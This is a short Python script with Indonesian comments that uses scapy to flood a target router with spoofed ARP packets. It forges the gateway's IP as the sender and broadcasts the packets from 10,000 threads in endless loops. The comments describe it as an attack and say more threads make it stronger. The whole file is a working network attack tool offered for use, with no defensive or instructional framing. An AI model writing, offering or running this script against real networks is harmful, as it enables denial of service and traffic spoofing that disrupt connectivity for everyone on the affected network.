import sys
import scapy.all as scapy
import threading
import time

# Konfigurasi
TARGET_IP = input("Masukkan IP Router Target: ")  # Ganti dengan IP router target
GATEWAY_IP = input("Masukkan IP Gateway: ")  # Ganti dengan IP gateway
NUM_THREADS = 10000  # Jumlah thread (semakin banyak, semakin kuat serangan)
SEND_INTERVAL = 0.30 # Jeda waktu pengiriman paket (semakin kecil, semakin cepat)

# Fungsi untuk mengirimkan paket ARP
def send_arp_packet():
    try:
        # Buat paket ARP
        arp_request = scapy.ARP(pdst=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=GATEWAY_IP)
        ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether_frame/arp_request

        # Kirim paket terus-menerus
        while True:
            scapy.sendp(packet, verbose=False)
            time.sleep(SEND_INTERVAL)
    except KeyboardInterrupt:
        print("\nSerangan dihentikan.")
        sys.exit()
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

# Buat dan jalankan thread
threads = []
for _ in range(NUM_THREADS):
    thread = threading.Thread(target=send_arp_packet)
    threads.append(thread)
    thread.start()

# Tunggu hingga serangan dihentikan
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nMenghentikan serangan...")
    sys.exit()
